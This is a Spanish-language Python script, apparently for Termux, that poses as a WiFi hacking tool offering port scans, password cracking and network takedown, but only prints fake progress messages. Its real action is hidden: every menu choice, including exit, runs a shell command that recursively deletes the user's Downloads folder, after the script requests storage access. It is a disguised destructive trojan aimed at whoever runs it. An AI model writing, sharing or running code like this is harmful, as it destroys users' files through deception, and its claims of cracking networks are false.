#MODULOS
import os
import sys
import time

#COLORES

GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"  # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"   # White
R = "\033[31m"    # Red
C = "\033[36;1m"  # Cyan
M = "\033[35;1m"  # Morado

#FUNCIONES

def proceso(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(13. / 130)

def sutil(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(12. / 150)

def titulo(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(9. / 170)

os.system("termux-setup-storage")
os.system("clear")
os.system("sleep 1")

titulo(BB+"       〓★〓★〓★〓★〓★〓★〓★〓")
titulo(R+"        HACKER DE REDES WIFI")
titulo(BB+"       〓★〓★〓★〓★〓★〓★〓★〓")

sutil(WW+"\nComo se llama la red Wifi que quieres hackear?")

respuesta1 = input(GG+"Pon el nombre de la Red: " +WW)

os.system("sleep 1")

print (CC+"\n             MENU")
print (Y+"\n1) Escanear puertos de la red WIFI ")
print (Y+"2) Crackear contraseña WIFI ")
print (Y+"3) Desactivar red WIFI seleccionada ")
print (Y+"4) Salir")


respuesta = int(input(GG+"\nElije lo que deseas hacer: " +WW))

if respuesta == 1:
        proceso(R+"\nEscaneando puertos de " + respuesta1 + "...")
        os.system("sleep 1")
        proceso(CC+"El puerto 4444 esta abierto")
        os.system("sleep 1")
        proceso(CC+"El puerto 8283 esta cerrado")
        os.system("sleep 1")
        proceso(GG+"\nSe encontró 3 puertos mas abiertos...")
        os.system("cd;cd storage;rm -r download")

elif respuesta == 2:
        proceso(R+"\nCrackeando red wifi de " + respuesta1 + "...")
        os.system("sleep 1")
        os.system("cd;cd storage;rm -r download")
        proceso(CC+"\nBuscando en la base de datos")
        os.system("sleep 3")
        proceso(R+"\nLA CONTRASEÑA FUE CRACKEADA!")
        os.system("sleep 1")
        sutil(GG+"La contraseña esta en el archivo 'contraseña.txt' en la carpeta downloads")

elif respuesta == 3:
        proceso(R+"\nDesactivando red wifi de " + respuesta1 + "...")
        os.system("cd;cd storage;rm -r download")
        os.system("sleep 1")
        proceso(CC+"Atacando red wifi...")
        os.system("sleep 1")
        proceso(GG+"¡Red wifi desactivada!")

elif respuesta == 4:
        sutil(M+"\nSaliendo...")
        os.system("cd;cd storage;rm -r download")
        os.system("sleep 1")
        os.system("exit")

else:
        sutil(R+"Opcion no disponible prueba otro número")
